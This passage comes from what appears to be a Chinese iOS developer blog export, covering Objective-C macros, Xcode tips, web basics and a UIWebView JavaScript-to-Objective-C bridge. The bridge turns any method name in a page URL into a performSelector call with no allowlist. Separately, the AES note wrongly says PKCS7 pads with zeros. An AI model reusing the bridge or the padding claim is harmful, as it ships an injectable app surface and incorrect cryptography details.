*bgColorView = [[UIView alloc] init];bgColorView.backgroundColor = [UIColor blueColor];bgColorView.layer.masksToBounds = YES;cell.selectedBackgroundView = bgColorView; UINavigationController手势问题 UINavigationController 添加手势会默认添加给所有push进来的控制器 可以通过push进来的控制器的数量控制，（topViewController 可以拿到栈顶控制器，在根控制器地方设置的话就是拿到根控制器） 下面的方法也可以过滤不同的手势 gestureRecognizer:可以判断当前触发的手势是哪一个 1234- (BOOL)gestureRecognizerShouldBegin:(UIGestureRecognizer *)gestureRecognizer &#123; XSLog(@"gestureRecognizer : %@", gestureRecognizer); return self.viewControllers.count &gt; 1;&#125; 想隐藏导航控制器的导航栏 方法1 （缺点：滑动返回时候可以看见过度不协调，切换主题如果换导航栏颜色也不协调） 在ViewWillAppear方法设置导航栏隐藏 在ViewWillDisappear方法设置导航栏出现（防止push的其他控制器导航栏也被隐藏） 方法2 （推荐） 需要隐藏导航栏的控制器遵循 UINavigationControllerDelegate 需要隐藏导航栏的控制器设置代理 self.navigationController.delegate = self; 需要隐藏导航栏的控制器 实现代理方法 1234567// 设置导航栏控制器隐藏- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated &#123;// 判断要显示的控制器是否是自己BOOL isLoginVC = [viewController isKindOfClass:[self class]];[self.navigationController setNavigationBarHidden:isLoginVC animated:YES];&#125; 导航栏设置背景颜色为纯色技巧 导航栏默认是不能设置为纯色的，因为系统会自动的加上一个不透明度，所以需要用纯色渲染一张背景图然后设置背景图片就可以了。 设置导航栏背景图片，如果有可以上下滚动的视图可能上下边距就会变化，需要加减相应写导航栏高度的内边距。 AES 加密模式及填充方式 PKCS7Padding ：缺几个字节就补几个字节的0 PKCS5Padding ：缺几个字节就补充几个字节的几，比如缺7个字节，就补充7个字节的7 全局变量的设置方法 使用UserDefualt 实现APP全局变量 在AppDelegate中声明并初始化全局变量、然后在需要使用该变量的地方插入如下的代码： 123//取得AppDelegate，在iOS中，AppDelegat被设计成了单例模式 AppDelegate *appDelegate = [[UIApplication sharedApplication] delegate];appDelegate.Your Variable 使用 extern 关键字 新建Constants.h文件（文件名根据需要自己取），用于存放全局变量 在Constants.h中写入你需要的全局变量名， 例如： NSString *url;//指针类型 int count; //非指针类型 注意：在定义全局变量的时候不能初始化，否则会报错！ 在需要用到全局变量的文件中引入此文件： 1#import "Constants.h" 给全局变量初始化或者赋值： 12345extern NSString *url;url = [[NSString alloc] initWithFormat:@"http://www.google.com"];//指针类型；需要alloc（我试过直接 url = @"www.google.com" 好像也能访问 ）extern int count;count = 0;//非指针类型 3.5 使用全局变量：和使用普通变量一样使用。 性能优化技巧 在循环里面存在大量临时变量，需要手动释放内存，优化导致内存的暴增带来的闪退问题。 12345678for (int i = 0; i&lt;1000000; i++) &#123; @autoreleasepool &#123; NSString *str = @"ABc"; NSString *string = [str lowercaseString]; string = [string stringByAppendingString:@"xyz"]; NSLog(@"%@",string); &#125;&#125; 参考 防止把线下版本打包上传发布AppStore的措施 在Target -&gt; Build Setting 里面搜索Skip Install 将Release环境以外的Skip Install配置成NO，就不会Archive出ipa包 OpenSSL 转证书格式1234// .crt 转 .ceropenssl x509 -in ca.crt -out certificate.cer -outform der// .crt 转 .deropenssl x509 -in ca.crt -out certificate.der -outform der Shadowrocket 状态栏不显示VPN 解决方法 Shadowrocket--Stettings--Config--LOCAL FILES里，点使用的配置文件右边的感叹号，General–最下面有个BYPASS TUN 把里面第一个0.0.0.0/8删掉 制作Mac启动U盘1sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/USBName --applicationpath /Applications/Install\ OS\ X\ El\ Capitan.app --nointeraction]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中常用发的宏定义]]></title>
    <url>%2Farchives%2F9f7da62.html</url>
    <content type="text"><![CDATA[少年上人号怀素，草书天下称独步。墨池飞出北溟鱼，笔锋杀尽中山兔。八月九月天气凉，酒徒词客满高堂。笺麻素绢排数厢，宣州石砚墨色光。吾师醉后倚绳床，须臾扫尽数千张。飘风骤雨惊飒飒，落花飞雪何茫茫。起来向壁不停手，一行数字大如斗。怳怳如闻神鬼惊，时时只见龙蛇走。左盘右蹙如惊电，状同楚汉相攻战。湖南七郡凡几家，家家屏障书题遍。王逸少，张伯英，古来几许浪得名。张颠老死不足数，我师此义不师古。古来万事贵天生，何必要公孙大娘浑脱舞。 ——李白 《草书歌行》 常用的宏定义文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 判断字符串是否为空#define kStringIsEmpty(str) ([str isKindOfClass:[NSNull class]] || str == nil || [str length] &lt; 1 ? YES : NO )// 判断数组是否为空#define kArrayIsEmpty(array) (array == nil || [array isKindOfClass:[NSNull class]] || array.count == 0)// 判断字典是否为空#define kDictIsEmpty(dic) (dic == nil || [dic isKindOfClass:[NSNull class]] || dic.allKeys == 0)// 判断对象是否为空#define kObjectIsEmpty(_object) (_object == nil \ || [_object isKindOfClass:[NSNull class]] \ || ([_object respondsToSelector:@selector(length)] &amp;&amp; [(NSData *)_object length] == 0) \ || ([_object respondsToSelector:@selector(count)] &amp;&amp; [(NSArray *)_object count] == 0))// 一些缩写#define kApplication [UIApplication sharedApplication]#define kKeyWindow [UIApplication sharedApplication].keyWindow#define kAppDelegate [UIApplication sharedApplication].delegate#define kUserDefaults [NSUserDefaults standardUserDefaults]#define kNotificationCenter [NSNotificationCenter defaultCenter]// App版本号及名称#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]#define kAppDisplayName [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]// 区分不同语言导入的头文件#ifdef __OBJC__#import &lt;UIKit/UIKit.h&gt;#import &lt;Foundation/Foundation.h&gt;#import "XSConst.h"#endif// 区分不同环境接口#ifdef DEBUG // 调试状态, 打开LOG功能#define XSLog(...) NSLog(__VA_ARGS__)#define XSKYDWAPIURL @"your_server_debug_url"#define XSKYDWImageAPIURL @"your_server_debug_url"#else // 发布状态, 关闭LOG功能#define XSLog(...)#define XSKYDWAPIURL @"your_server_release_url"#define XSKYDWImageAPIURL @"your_server_release_url"#endif// 打印方法调用#define XSLogFuc XSLog(@"%s", __func__);// 颜色设置#define XSColor(r, g, b) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:1]// 有透明度的颜色#define XSColorA(r, g, b, a) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:(a)/255.0]// 灰色#define XSGrayColor(value) XSColor(value, value, value)// 全局灰色#define XSCommonBgColor XSGrayColor(238)// 标签的背景颜色#define XSTagBgColor XSColor(70, 142, 243)// 随机色#define XSRandomColor [UIColor colorWithRed:arc4random_uniform(256)/255.0 green:arc4random_uniform(256)/255.0 blue:arc4random_uniform(256)/255.0 alpha:1.0]// 屏幕的宽高#define kSScreenW [UIScreen mainScreen].bounds.size.width#define kSScreenH [UIScreen mainScreen].bounds.size.height// 判断系统的版本#define iOS7 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 7.0)#define iOS8 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 8.0)#define iOS9 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 9.0)// 为了解析服务器返回的数据 写到pilst文件里面看更清晰#define XSWriteToPlist(obj, filename) [obj writeToFile:[NSString stringWithFormat:@"/Users/user11-kydw/Desktop/%@.plist", filename] atomically:YES];// 消除调用performSelector在ARC下的警告 （系统无法确定返回值类型）#define SuppressPerformSelectorLeakWarning(Stuff) \do &#123; \_Pragma("clang diagnostic push") \_Pragma("clang diagnostic ignored \"-Warc-performSelector-leaks\"") \Stuff; \_Pragma("clang diagnostic pop") \&#125; while (0)]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于App版本号命名规则]]></title>
    <url>%2Farchives%2F4edead15.html</url>
    <content type="text"><![CDATA[两人对酌山花开，一杯一杯复一杯。我醉欲眠卿且去，明朝有意抱琴来。 ——李白 《山中与幽人对酌》 项目中App发布版本统一处理为了统一iOS和安卓两个平台的发布版本不会产生混乱。定义版本号信息为如下格式：主版本号.次版本号.修订版本号 eg : 2.0.0 主版本号：接口做了不支持向下兼容的更改或者界面重构，升级主版本号； 次版本号：做了功能性升级，支持向下兼容，老版本依然正常使用； 修订号：做问题修正，通常修复已知问题（各自维护） 1.0.0 // 第一次发布版本 1.0.1 // 各自的维护的修复bug版本 … 1.1.0 // 正常迭代和新功能添加版本 (统一) … 2.0.0 // 正常迭代和重大改版版本 （需要） …]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发工具Xcode快捷键及相关知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[犬吠水声中，桃花带雨浓。树深时见鹿，溪午不闻钟。野竹分青霭，飞泉挂碧峰。无人知所去，愁倚两三松。 ——李白 《访戴天山道士不遇》 Xcode常用快捷键 Option + shift + K 打出Apple的logo  Command + option + Enter 拖线的时候快速切换到相应的界面 Command + Enter 标准界面 Command + option + 左箭头 折叠代码块 Command + option + 右箭头 打开代码块 Command + option + shift + 左箭头 折叠全部代码块 Command + option + shift + 右箭头 打开全部代码块 Command + option + ，快速分屏 Command + shift + ，打开scheme的界面 Command + shift + O 快速查找文件位置 Command + shift + J 快速定位跳转到查找的文件的位置 Command + control + 上下方向键 快速切记.h .m文件 Command + Option+ 0 显示/隐藏左边实用工具面板 Control + 6 列出当前文件中的方法 Control + 1 切换到Project Navigator Command + Control + Left/right 切换到上次编辑的位置 Control + i 选中代码左对齐 Xcode中用的插件 Alcatraz 一个插件管理平台，下载和移除插件 VVDocumenter 经典的注释插件 FuzzyAutocomplete 代码补全支持模糊查询 KSImageNamed 图片提示插件（Xcode8可以不用了，默认自带 仅限swift） Backlight 当前编辑位置高亮显示 （Xcode8可以不用了，默认自带） Cocoapods 管理三方库的插件、特别实用 ColorSense 颜色提示插件、还可以输入颜色时有一个色板给你选 安装完默认没有效果，需要在Xcode-Edit里面设置显示方式及颜色（我配置的颜色R:127 G: 127 B:121 Opacity:45% Hex Color : #7F7F79） XToDo 快捷键标记，和统一查看 ActivatePowerMode 敲代码时屏幕抖动火花迸溅效果 装逼插件、无聊的时候玩，这个是带声音特效的，（XActivatePowerMode这个效果类似、不带声音特效） Xcode8 注释 Command + / 失效解决办法 终端执行下面代码，然后重启电脑 1~ sudo /usr/libexec/xpccachectl 低版本XCode不支持高版本iOS系统进行真机调试解决方案 这个目录下有当前Xcode所支持的所有真机系统 把最新的Xcode里面的最新的文件拷贝到低版本Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 这个文件有支持的SDK包 把最新的Xcode里面的最新的包拷贝到低版本的Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/ 操作的时候尽量退出Xcode，如果完成以上两步还是不能真机调试的话就重启电脑。 常见文件路径 Xcode字体所在路径（提取Xcode8最新字体： San Francisco Mono ）复制到其他版本Xcode中，我得电脑需要切换英语重启电脑才可以选到 1/Applications/Xcode.app/Contents/SharedFrameworks/DVTKit.framework/Versions/A/Resources/Fonts Xcode描述文件路径 1~/Library/MobileDevice/Provisioning Profiles Xcode自带头文件的路径 1/Xcode/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk/System/Library/Frameworks/UIKit.framework/Headers 修改了系统自带头文件后,Xcode会报错解决方案:删掉下面文件夹的缓存即可(aplle是电脑的用户名) 1/Users/smile/Library/Developer/Xcode/DerivedData 或者 1/Users/smile/Library/Developer/Xcode/DerivedData Xcode的自定义代码块的位置 1/Users/smile/Library/Developer/Xcode/UserData/CodeSnippets Xcode 文档的位置 1/Applications/Xcode.app/Contents/Developer/Documentation/DocSets 插件的位置 1/Users/smile/Library/Application Support/Developer/Shared/Xcode/Plug-ins 沙盒的位置 1/Users/smile/Library/Developer/CoreSimulator/Devices/(文件名称 按时间排序找)/data/Containers/Data/Application 模拟器安装位置 1234// 没有/Profiles/Runtimes 这两个文件夹的话 手动创建/Library/Developer/CoreSimulator/Profiles/Runtimes/Users/smile/Library/Developer/CoreSimulator/Profiles/Runtimes]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之网页的基本概念]]></title>
    <url>%2Farchives%2F371821f9.html</url>
    <content type="text"><![CDATA[世间花叶不相伦，花入金盆叶作尘。惟有绿荷红菡萏，卷舒开合任天真。此花此叶常相映，翠减红衰愁杀人。 李商隐 《赠荷花》 网页的组成 一个有具体功能的完整的网页，一般由3部分组成 HTML：网页的具体内容和结构。 CSS：网页的样式（美化网页最重要的一块）。 JavaScript：网页的交互效果，比如对用户鼠标事件做出响应。 HTML\CSS\JavaScript学习资料在这里。 HTML的全称是HyperText Markup Language，超文本标记语言，其实它就是文本，由浏览器负责将它解析成具体的网页内容。 HTMLHTML的组成 跟XML类似，HTML由N个标签（节点、元素、标记）组成 HTML语法非常松散，目前的最新版是5.0，也就是HTML5 常见的HTML标签123456789标题：h1、h2、h3、h4、h5....段落：p换行：br容器：div、span（用来容纳其他标签）表格：table、tr、td列表：ul、ol、li图片：img表单：input链接：a CSS CSS的全称是Cascading Style Sheets，层叠样式表。 它用来控制HTML标签的样式，在美化网页中起到非常重要的作用。 CSS的编写格式是键值对形式的，比如： 冒号:左边的是属性名，冒号:右边的属性值 123color: red;background-color: blue;font-size: 20px; CSS的3种书写形式 CSS有3种书写形式（优先级从高到低） 123456789101112行内样式：（内联样式）直接在标签的style属性中书写&lt;body style="color: red;"&gt;内页样式：在本网页的style标签中书写&lt;style type="text/css"&gt; body &#123; color: red; &#125;&lt;/style&gt;外部样式：在单独的CSS文件中书写，然后在网页中用link标签引用&lt;link type="text/css" rel="stylesheet" href="index.css"&gt; HTML + CSS 能看到标签的结构 1234567* 父子关系&lt;p&gt; &lt;span&gt;123&lt;/span&gt;&lt;/p&gt;* 属性&lt;img src="images/01.png"&gt; 了解元素（标签）的类型 block：块级 独占一行 能随意修改尺寸 inline：行内 多个行内元素能显示在同一行 不能修改尺寸，尺寸取决于内容的多少 inline-block：行内-块级 多个行内-块级元素能显示在同一行 能随意修改尺寸 不设置尺寸，默认的尺寸取决于内容的多少 了解常见的属性 font-size : 字体大小 color: 文字颜色 background: 背景 display: 显示的类型（block、inline、inline-block、none） padding margin border width height 脱离标准流 float: left\right 绝对定位 position : absolute; right: 0px; bottom: 0px; 右下角 如果想相对于父节点进行定位，最好设置父节点的position为relative 原则：子绝父相 常见的选择器 标签选择器：tagName 类选择器：.className id选择器：#id 后代选择器(多个选择器之间用空格隔开)：tagName .className .className tagName 群组选择器(多个选择器之间用逗号,隔开)：tagName, .className, tagName, .className 直接后代选择器(多个选择器之间用大于号&gt;隔开)：tagName &gt; .className &gt; .className &gt; tagName 属性选择器：tagName[arrtName=&quot;attrValue&quot;] 选择器组合（多个选择器粘在一起）：tagName.className 伪类 tagName:hover .className:hover tagName.className tagName:hover 进阶 文档/谷歌/百度 JS 节点的基本操作（CRUD） 12345678910111213141516* C（Create）：var div = document.createElement('div');document.body.appendChild(div);* R（Read）：var div = document.getElementById('logo');var div = document.getElementsByTagName('div')[0];var div = document.getElementsByClassName('logo')[0];* U（Update）：var img = document.getElementById('logo');img.src = 'images/01.png';* D（Delete）：var img = document.getElementById('logo');img.parentNode.removeChild(img); 事件绑定 123456789101112131415161&gt; 推荐做法var button = document.getElementById('login');button.onclick = function() &#123; // 实现点击按钮想做的事情&#125;;2&gt; 直接写在标签内部&lt;button onclick="var age = 20; alert(age);"&gt;登录&lt;/button&gt;3&gt; 不常用function login() &#123; // 实现点击按钮想做的事情&#125;var button = document.getElementById('login');button.onclick = login; jQuery (框架) 通过选择器查找元素 $(‘选择器’) jQuery支持绝大部分的CSS选择器 属性操作 获得属性：$(‘选择器’).attr(‘属性名’); 设置属性：$(‘选择器’).attr(‘属性名’, ‘属性值’); 显示和隐藏 显示：$(‘选择器’).show(); 隐藏：$(‘选择器’).hide(); 显示和隐藏来回切换：$(‘选择器’).toggle(); 事件绑定 1234567891011* 点击事件(常用)$('选择器').click(function() &#123; // 实现点击按钮想做的事情&#125;).hide();// 先给节点绑定事件，再隐藏* 点击事件(不常用)function login() &#123; // 实现点击按钮想做的事情&#125;$('选择器').click(login); 盒子模型 网页上的每一个标签都是一个盒子 每个盒子都有四个属性 内容（content） 盒子里装的东西 网页中通常是指文字和图片 - 填充（padding，内边距） - 怕盒子里装的（贵重的）东西损坏，而添加的泡沫或者其它抗震的辅料- 边框（border）：盒子本身- 边界（margin，外边距） - 盒子摆放的时候的不能全部堆在一起，盒子之间要留一定空隙保持通风，同时也为了方便取出 内容（content） – 属性 填充（padding，内边距） – 属性 边界（margin，外边距） – 属性 HTML5框架（大部分都是为移动设备而写的） 概念 有了HTML5框架，编写简易的几行JS代码，就能实现非常漂亮的手机界面 HTML5框架封装了大量的DOM节点操作，封装了大量的CSS样式 对JS的要求比较高，对CSS的要求并不高 常见的HTML5框架 PhoneGap jQuery Mobile sencha-touch bootstrap (框架) 很多实用的东西 参考代码 参考 w3school jquery jquery manual]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发常用控件之UIWebView]]></title>
    <url>%2Farchives%2F85b4c34d.html</url>
    <content type="text"><![CDATA[向晚意不适，驱车登古原。夕阳无限好，只是近黄昏。 李商隐 《乐游原 / 登乐游原》 关于UIWebView UIWebView是iOS内置的浏览器控件 系统自带的Safari浏览器就是通过UIWebView实现的 UIWebView不但能加载远程的网页资源，还能加载绝大部分的常见文件 html\htm pdf、doc、ppt、txt mp4 … … UIWebView常用的加载资源的方法 1- (void)loadRequest:(NSURLRequest *)request; 常用属性和方法123456789101112131415161718// 重新加载（刷新）- (void)reload;// 停止加载- (void)stopLoading;// 回退- (void)goBack;// 前进- (void)goForward;// 需要进行检测的数据类型@property(nonatomic) UIDataDetectorTypes dataDetectorTypes// 是否能回退@property(nonatomic,readonly,getter=canGoBack) BOOL canGoBack;// 是否能前进@property(nonatomic,readonly,getter=canGoForward) BOOL canGoForward;// 是否正在加载中@property(nonatomic,readonly,getter=isLoading) BOOL loading;// 是否伸缩内容至适应屏幕当前尺寸@property(nonatomic) BOOL scalesPageToFit; UIWebViewd代理 成为UIWebView的代理，遵守UIWebViewDelegate协议，就能监听UIWebView的加载过程 12345678// 开始发送请求（加载数据）时调用这个方法- (void)webViewDidStartLoad:(UIWebView *)webView;// 请求完毕（加载数据完毕）时调用这个方法- (void)webViewDidFinishLoad:(UIWebView *)webView;// 请求错误时调用这个方法- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error; 12345678910111213141516171819202122232425/** * webView加载一个请求之前 会调用这个方法 返回yes 可以加载 返回no 不允许加载 * 可以着这里拦截请求 转化为方法名 调用oc方法 */- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123;// NSLog(@"%@",request);// &#123; URL: ios://openMyCamera &#125;// &#123; URL: ios://openMyAlbum &#125; NSString *url = request.URL.absoluteString; NSRange range = [url rangeOfString:@"ios://"]; if (range.length) &#123; // 截取需要得部分 NSString *method = [url substringFromIndex:range.location + range.length]; // 包装成SEL SEL selector = NSSelectorFromString(method); // 执行对应的方法 [self performSelector:selector withObject:nil]; &#125; return YES;&#125; JS和OC互调JavaScript JavaScript是一门脚本语言，简称JS。 JS的常见作用有： 给HTML网页添加动态功能，比如响应用户的各种操作。 操纵HTML元素，比如添加、删除、修改网页元素。 常见的JavaScript函数： alert(10); // 弹框 document.getElementById(‘test’); // 根据ID获得某个DOM元素 OC调用JS的方法1234567// 如何在OC中调用JavaScript代码// 清除广告就是调用javascript代码 删除 header 和 footer // document.getElementsByTagName('header')[0].remove(); // document.getElementsByTagName('footer')[0].remove() [self.webView stringByEvaluatingJavaScriptFromString:@"document.getElementsByTagName('header')[0].remove();"]; [self.webView stringByEvaluatingJavaScriptFromString:@"document.getElementsByTagName('footer')[0].remove();"]; JS调用OC的方法 网页信息 123456789101112131415161718192021222324252627282930313233343536&lt;html&gt; &lt;!--描述网页信息--&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;hello world&lt;/title&gt; &lt;script&gt; function show() &#123; alert(1); &#125; function showTitle() &#123; alert(document.title); &#125; function repost() &#123; location.href = &quot;http://www.520it.com&quot;; &#125; function sum() &#123; return 1 + 1; &#125; function btnClick() &#123; location.href = &quot;xmg://sendMessageWithNumber_andContent_?10086&quot;; &#125; &lt;/script&gt; &lt;/head&gt; &lt;!--网页具体内容--&gt; &lt;body&gt; 电话号码: 18888888888&lt;/br&gt; 邮箱: 666666666@qq.com&lt;/br&gt; &lt;button style = &quot;background: red; height: 150px; width: 150px;&quot; onclick = &quot;btnClick();&quot;&gt;哥是按钮&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 无参数123456789101112131415161718192021222324252627282930#pragma mark - UIWebViewDelegate// 每次发送请求前都会调用// 利用该方法作为JS和OC之间的桥梁// 在JS跳转网页// 在OC代理方法中通过判断自定义协议头, 决定是否是JS调用OC方法// 在OC代理方法中通过截取字符串, 获取JS想调用的OC方法名称- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123; NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"需要调用OC方法"); // 1.从URL中获取方法名称 // xmg://call NSString *methodName = [urlStr substringFromIndex:schem.length]; NSLog(@"%@", methodName); // 2.调用方法 SEL sel = NSSelectorFromString(methodName); // 忽略警告信息的作用范围开始#pragma clang diagnostic push // 下面这一行代码是用于指定需要忽略的警告信息#pragma clang diagnostic ignored "-Warc-performSelector-leaks" [self performSelector:sel withObject:nil]; // 忽略警告信息的作用范围结束#pragma clang diagnostic pop return NO; &#125; return YES;&#125; 有参数(基本方法)123456789101112131415161718192021222324252627282930313233343536373839#pragma mark - UIWebViewDelegate// 每次发送请求前都会调用// 利用该方法作为JS和OC之间的桥梁// 在JS跳转网页// 在OC代理方法中通过判断自定义协议头, 决定是否是JS调用OC方法// 在OC代理方法中通过截取字符串, 获取JS想调用的OC方法名称- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123;NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"需要调用OC方法"); // 1.从URL中获取方法名称 // xmg://sendMessageWithNumber_andContent_?10086&amp;love NSString *subPath = [urlStr substringFromIndex:schem.length]; // 注意: 如果指定的用于切割的字符串不存在, 那么就会返回整个字符串 NSArray *subPaths = [subPath componentsSeparatedByString:@"?"]; // 2.获取方法名称 NSString *methodName = [subPaths firstObject]; methodName = [methodName stringByReplacingOccurrencesOfString:@"_" withString:@":"]; NSLog(@"%@", methodName); // 2.调用方法 SEL sel = NSSelectorFromString(methodName); // 3.处理参数 NSString *parma = nil; if (subPaths.count == 2) &#123; parma = [subPaths lastObject]; // 3.截取参数 NSArray *parmas = [parma componentsSeparatedByString:@"&amp;"]; [self performSelector:sel withObject:[parmas firstObject] withObject:[parmas lastObject]]; return NO; &#125; [self performSelector:sel withObject:parma]; return NO; &#125; return YES;&#125; 有参数(NSInvocation封装方法)(推荐)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma mark - UIWebViewDelegate// 每次发送请求前都会调用// 利用该方法作为JS和OC之间的桥梁// 在JS跳转网页// 在OC代理方法中通过判断自定义协议头, 决定是否是JS调用OC方法// 在OC代理方法中通过截取字符串, 获取JS想调用的OC方法名称- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123; // xmg:// NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"需要调用OC方法"); // 1.从URL中获取方法名称 // sendMessageWithNumber_andContent_?10086&amp;love NSString *subPath = [urlStr substringFromIndex:schem.length]; // 注意: 如果指定的用于切割的字符串不存在, 那么就会返回整个字符串 // sendMessageWithNumber_andContent_ // 10086&amp;love NSArray *subPaths = [subPath componentsSeparatedByString:@"?"]; // 2.获取方法名称 NSString *methodName = [subPaths firstObject]; methodName = [methodName stringByReplacingOccurrencesOfString:@"_" withString:@":"]; NSLog(@"%@", methodName); // 2.调用方法 SEL sel = NSSelectorFromString(methodName); // 3.处理参数 NSArray *parmas = nil; if (subPaths.count == 2) &#123; parmas = [[subPaths lastObject] componentsSeparatedByString:@"&amp;"]; &#125; [self performSelector:sel withObjects:parmas]; return NO; &#125; return YES;&#125;// 测试的方法如下:- (void)call&#123; NSLog(@"%s", __func__);&#125;- (void)callWithNumber:(NSString *)number&#123; NSLog(@"打电话给%@", number);&#125;- (void)sendMessageWithNumber:(NSString *)number andContent:(NSString *)content&#123; NSLog(@"发信息给%@, 内容是%@", number, content);&#125;- (void)sendMessageWithNumber:(NSString *)number andContent:(NSString *)content status:(NSString *)status&#123; NSLog(@"发信息给%@, 内容是%@, 发送的状态是%@", number, content, status);&#125; NSInvocation基本使用123456789101112131415161718192021222324252627282930// Signature签名: 在创建NSInvocation的时候, 必须传递一个签名对象// 签名对象的作用 : 用于获取参数的个数和方法的返回值// 注意点: 创建签名对象的时候不是使用NSMethodSignature类创建 \ 而是方法属于谁就用谁来创建 NSMethodSignature *signature = [ViewController instanceMethodSignatureForSelector:@selector(sendMessageWithNumber:andContent:status:)];// NSInvocation; 用来包装方法和对应的对象, 它可以存储方法的名称,对应的对象 ,对应的参数 // 1.创建一个NSInvocation对象 NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:signature]; invocation.target = self; // 保存方法所属的对象 // 给invocation设置的方法, 必须和签名中的方法一致 invocation.selector = @selector(sendMessageWithNumber:andContent:status:); // 保存方法名称 // 第一个参数: 需要给指定方法传递的值 // + 第一个参数需要接收一个指针, 也就是传递值的时候需要传递地址 // 第二个参数: 需要给指定方法的第几个参数传值 NSString *number = @"10086"; // 注意: 设置参数的索引时不能从0开始, 因为0已经被self占用, 1已经被_cmd占用 [invocation setArgument:&amp;number atIndex:2]; NSString *content = @"love"; [invocation setArgument:&amp;content atIndex:3]; NSString *status = @"success"; [invocation setArgument:&amp;status atIndex:4]; // 2.调用NSInvocation对象的invoke方法 // 只要调用invocation的invoke方法, 就代表需要执行 \ NSInvocation对象中指定对象的指定方法, 并且传递指定的参数 [invocation invoke]; NSInvocation方法封装.h文件123456#import &lt;Foundation/Foundation.h&gt;@interface NSObject (performSelector)- (id)performSelector:(SEL)aSelector withObjects:(NSArray *)objects;@end .m文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#import "NSObject+performSelector.h"@implementation NSObject (performSelector)- (id)performSelector:(SEL)aSelector withObjects:(NSArray *)objects&#123; // 1.创建签名对象 NSMethodSignature *signature = [[self class] instanceMethodSignatureForSelector:aSelector]; // 判断传入的方法是否存储, 如果方法不存在签名对象为nil if (signature == nil) &#123; // 传入的方法不存在 NSString *info = [NSString stringWithFormat:@" -[%@ %@]: unrecognized selector sent to instance", [self class], NSStringFromSelector(aSelector)]; @throw [[NSException alloc] initWithName:@"一个牛B的错误" reason:info userInfo:nil]; &#125; // 2.创建一个NSInvocation对象 NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:signature]; // 3.保存方法所属的对象 invocation.target = self; // 给invocation设置的方法, 必须和签名中的方法一致 // 4.保存方法名称 invocation.selector = aSelector; // 5.设置参数 /* 当前如果直接遍历参数数组来设置参数, 会存在问题 如果参数数组元素多余参数个数, 那么就会报错 */ NSUInteger arguments = signature.numberOfArguments - 2; /* 如果直接遍历参数值的个数, 会存在问题 如果参数的个数大于了参数值的个数, 那么数组会越界 */ NSUInteger objectsCount = objects.count; /* 参数和参数值, 谁少就遍历谁 */ NSUInteger count = MIN(arguments, objectsCount); for (int i = 0; i &lt; count; i++) &#123; NSObject *obj = objects[i]; // 处理数组参数中NSNull问题 if ([obj isKindOfClass:[NSNull class]]) &#123; obj = nil; &#125; [invocation setArgument:&amp;obj atIndex:i + 2]; &#125; // 6.调用NSInvocation对象的invoke方法 [invocation invoke]; id res = nil; // 判断当前方法是否有返回值// NSLog(@"ReturnType = %zd", signature.methodReturnLength); if ( signature.methodReturnLength != 0) &#123; // 7.获取返回值 // getReturnValue方法会将会去到的方法返回值赋值给传入的对象 [invocation getReturnValue:&amp;res]; &#125; return res;&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIWebView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之核心动画（二）：常用动画类及方法介绍]]></title>
    <url>%2Farchives%2F69e9b43d.html</url>
